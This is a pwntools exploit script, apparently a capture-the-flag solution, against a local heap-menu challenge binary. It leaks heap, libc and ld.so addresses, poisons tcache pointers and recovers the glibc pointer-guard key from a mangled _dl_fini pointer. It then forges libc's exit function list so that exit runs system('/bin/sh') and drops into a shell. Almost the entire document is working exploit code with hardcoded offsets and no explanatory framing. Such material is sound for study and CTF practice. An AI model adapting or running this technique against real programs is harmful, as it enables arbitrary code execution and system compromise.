from pwn import *

target = process("./chall-05")
gdb.attach(target)

MENU_STRING = b"Please enter menu choice:\n"

# Our I/O Wrapper Functions
def allocate_new_chunk(chunk_size: int, chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"1")
	target.recvuntil(b"Enter the chunk size between 0x0-0x1000:\n")
	target.sendline(bytes(str(chunk_size), "utf-8"))
	target.recvuntil(b"Which chunk spot would you like to allocate?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def view_chunk(chunk_idx: int) -> bytes:
	target.recvuntil(MENU_STRING)
	target.sendline(b"2")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Chunk Contents: ")
	contents = target.recvuntil(b"\x0d\x0a")
	return contents[:-2]

def edit_chunk(chunk_idx: int, chunk_contents: bytes) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"3")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))
	target.recvuntil(b"Please input new chunk content:\n")
	target.sendline(chunk_contents)

def free_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"4")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def remove_chunk(chunk_idx: int) -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"5")
	target.recvuntil(b"Which chunk idx would you like?\n")
	target.sendline(bytes(str(chunk_idx), "utf-8"))

def secret() -> None:
	target.recvuntil(MENU_STRING)
	target.sendline(b"6")

def shift_right_carry(number: int, shift_amount: int) -> int:
  for i in range(shift_amount):
    if (number & 1) == 0:
      number = number >> 1
    else:
      number = (number >> 1) | 0x8000000000000000
  return number

def shift_left_carry(number: int, shift_amount: int) -> int:
  for i in range(shift_amount):
    if ((number & 0x8000000000000000) != 0):
      number = ((number << 1) & 0xffffffffffffffff) | 0x1
    else:
      number = ((number << 1) & 0xffffffffffffffff)
  return number

def mangle_instruction_ptr(ins_ptr: int, key: int) -> int:
  mangled_ptr = ins_ptr ^ key
  mangled_ptr = shift_left_carry(mangled_ptr, 0x11)
  return mangled_ptr

def demangle_instruction_ptr(mangled_ins_ptr: int, key: int) -> int:
  demangled_ptr = shift_right_carry(mangled_ins_ptr, 0x11)
  demangled_ptr = demangled_ptr ^ key
  return demangled_ptr

# So first off, we need ot get our libc / heak infoleak

# Allocate the chunks for it
allocate_new_chunk(0x410, 0)
allocate_new_chunk(0x80, 1)
allocate_new_chunk(0x410, 2)
allocate_new_chunk(0x80, 3)

# Free two chunks, insert them into the unsorted bin
free_chunk(0)
free_chunk(2)

# Allocate a chunk, to move the two chunks over to large bin
allocate_new_chunk(0x500, 4)

# 0
input()

# Get the heap / libc infoleaks

leak_heap_bytes = view_chunk(0)
leak_libc_bytes = view_chunk(2)

leak_heap = u64(leak_heap_bytes + b"\x00"*(8-len(leak_heap_bytes)))
leak_libc = u64(leak_libc_bytes + b"\x00"*(8-len(leak_libc_bytes)))

heap_base = leak_heap - 0x1b60
libc_base = leak_libc - 0x22d0f0

print("Heap Base: " + hex(heap_base))
print("Libc Base: " + hex(libc_base))

# Next up, let's figure out the __pointer_chk_guard_local key

# First we will need the `_dl_fini` address
# Let's allocate a tcache chunk, to leak a `ld.so` address

# Allocate two tcache bin chunks
allocate_new_chunk(0xa0, 5)
allocate_new_chunk(0xa0, 6)

# Insert them into the tcache
free_chunk(5)
free_chunk(6)

# Calculate the mangled next address
tcache_chunk_address1 = heap_base + 0x1c20
ld_ptr_address = libc_base + 0x22c1b0

mangled_next = (ld_ptr_address ^ (tcache_chunk_address1 >> 12))

# Overwrite tcache next ptr of the head
edit_chunk(6, p64(mangled_next))

# Remove them, so we can reuse the 5/6 indices
remove_chunk(5)
remove_chunk(6)

allocate_new_chunk(0xa0, 5)
# Get the chunk to the ld.so ptr with this allocation
allocate_new_chunk(0xa0, 6)

# Fill up the space to the ptr
edit_chunk(6, b"0"*23)

# 1
input()

# Get the `ld.so` address, calculate `ld.so` base

ld_leak_bytes = view_chunk(6)
ld_address_leak_bytes = ld_leak_bytes[24:]
ld_leak_address = u64(ld_address_leak_bytes + b"\x00"*(8-len(ld_address_leak_bytes)))
ld_base = ld_leak_address - 0x16340
dl_fini_address = ld_base + 0x3d30

print("ld base: " + hex(ld_base))
print("_dl_fini address: " + hex(dl_fini_address))

# So we have the address of dl_fini
# Let's go ahead and allocate a chunk to initial
# We will do this, to both leak the mangled instruction ptr
# And then, write our own exit_function

# Libc addresses we will need
initial_address = libc_base + 0x22e1a0
system_address = libc_base + 0x48810
binsh_address = libc_base + 0x18cf2d

print("Initial Address: " + hex(initial_address))

# Free two chunks insert them into the tcache
free_chunk(1)
free_chunk(3)

# Prepare the mangled next ptr for initial

tcache_chunk_address = heap_base + 0x1f90
print("Tcache Chunk: " + hex(tcache_chunk_address))
mangled_next = (initial_address ^ (tcache_chunk_address >> 12))
print("Mangled Next: " + hex(mangled_next))

# Overwrite the next ptr of the head, with our mangled next ptr to initial

edit_chunk(3, p64(mangled_next))

remove_chunk(1)
remove_chunk(3)

allocate_new_chunk(0x80, 1)
# Get the ptr to initial
allocate_new_chunk(0x80, 3)

# 2
input()

# Fill up the data, from the start of our chunk
# To the mangled _dl_fini instruction ptr
edit_chunk(3, b"0"*23)

# 3
input()

# Get the leak
# With the mangled _dl_fini ptr, and actual _dl_fini ptr
# Calculate what the key is

key_leak_bytes = view_chunk(3)
mangled_ins_ptr_bytes = key_leak_bytes[24:]
mangled_ins_ptr = u64(mangled_ins_ptr_bytes)

print("dl_fini: " + hex(dl_fini_address))
print("mangled_ins_ptr: " + hex(mangled_ins_ptr))

key = ((shift_right_carry(mangled_ins_ptr, 0x11)) ^ dl_fini_address)

print("Key is: " + hex(key))

# Now that we have the key, calculate what the mangled address of `system` will be
mangled_system_address = mangle_instruction_ptr(system_address, key)

# Now we have everything, make the exit_function / exit_function_list

'''
Next_ptr				0x00
idx 						0x01
flavor 					0x04
mangled_ins_ptr
binsh_address
dso handle			0x00
'''


exit_function = \
				p64(0x04) + \
				p64(mangled_system_address) + \
				p64(binsh_address) + \
				p64(0x00)

exit_function_list = \
				p64(0x00) + \
				p64(0x01) + \
				exit_function

# Overwrite the existing exit function list with our own
edit_chunk(3, exit_function_list)

# Call system("/bin/sh") via calling exit
secret()

# Enjoy the shell!
target.interactive()
